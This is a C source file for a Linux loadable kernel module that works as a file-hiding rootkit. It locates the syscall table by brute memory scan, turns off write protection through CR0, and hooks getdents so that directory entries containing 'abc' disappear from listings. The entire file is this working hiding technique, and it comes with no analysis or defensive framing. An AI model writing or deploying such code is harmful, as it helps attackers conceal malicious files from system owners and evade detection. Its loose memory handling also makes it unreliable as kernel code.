#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/fcntl.h>
#include <asm/errno.h>
#include <linux/kernel.h>
#include <linux/fs.h> 
#include <linux/cdev.h>
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/init.h>
#include <linux/errno.h> 
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>  
#include <asm/page.h>  
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/err.h>
#include <linux/scatterlist.h>
#include <linux/mutex.h>
#include <linux/syscalls.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/jiffies.h>

struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
};


unsigned long **sys_call_table;
static unsigned long **find_sys_call_table(void);
static unsigned long **find_sys_call_table() {
    unsigned long offset;
    unsigned long **sct;
    
    int flag=0;

    for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
        sct = (unsigned long **) offset;
    
        if(sct[__NR_close] == (unsigned long *) sys_close)
              if( flag==0){
                 printk(KERN_ERR "find sys call table :%lx ",sct);
                 return sct;
                }else{
                printk(KERN_ERR "find first  sys call table :%llx ",sct);
                flag--;

        }

    }
    return NULL;
}


asmlinkage long (*original_getdents)(unsigned int fd,struct linux_dirent *dirp,unsigned int count );
asmlinkage long lsinfo(unsigned int fd,struct linux_dirent *dirp,unsigned int count) {
	struct linux_dirent *d2,*d3,*d;
	printk("getdent hijacked\n");
	unsigned int tmp, n;
 	int t, proc = 0;
 	struct inode *dinode;
	char hide[]="abc";
 	struct linux_dirent *dirp2, *dirp3;
 	tmp = (*original_getdents) (fd, dirp, count);
	if (tmp > 0) 
 	{
  		dirp2 = (struct linux_dirent *) kmalloc(tmp, GFP_KERNEL);
		copy_from_user(dirp2,dirp,tmp);
  		dirp3 = dirp2;
  		t = tmp;
  		while (t > 0) 
  		{
			n = dirp3->d_reclen;
		   	t -= n;
		   	if (strnstr((char *) &(dirp3->d_name),hide,3) != NULL)
		   	{
				//printk("%s has prefix",dirp3->d_name);
		    		if (t != 0)
		     			memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
		    		else
		     			dirp3->d_off = 1024;
		    		tmp -= n;
		   	}
		   	if (dirp3->d_reclen == 0) 
		   	{
		    		tmp -= t;
		    		t = 0;
		   	}
		  	if (t != 0){
				//printk("%s does not have prefix",dirp3->d_name);
		   		dirp3 = (struct linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
			}
		}
		copy_to_user(dirp, dirp2, tmp);
		kfree(dirp2);
 	}
 	return tmp;
}


static int ls_init(void) {
	printk(KERN_ALERT "\nADDING SYSTEM CALL\n");
        sys_call_table = find_sys_call_table();
	printk("System table address is %llx\n",sys_call_table);
        original_getdents = (void*)(sys_call_table[__NR_getdents]);
	printk("Original address of getdens is %llx",original_getdents);
        write_cr0 (read_cr0 () & (~ 0x10000));
        sys_call_table[__NR_getdents]=(void *)&lsinfo;
	printk("Address after modification %llx\n",sys_call_table[__NR_getdents]);
        write_cr0 (read_cr0 () | 0x10000);
        printk("\naddresss of sys_getents is changed\n");
        return 0;
}
 
static void ls_exit(void) {
 	printk("REMOVING ADDED SYSTEM CALL via LKM\n");
	write_cr0 (read_cr0 () & (~ 0x10000));                         
        sys_call_table[__NR_getdents]=(void *)original_getdents;                   
        write_cr0 (read_cr0 () | 0x10000);                             
        printk("MODULE EXIT\n");
	return;
}
 
MODULE_LICENSE("GPL");   
module_init(ls_init);
module_exit(ls_exit);
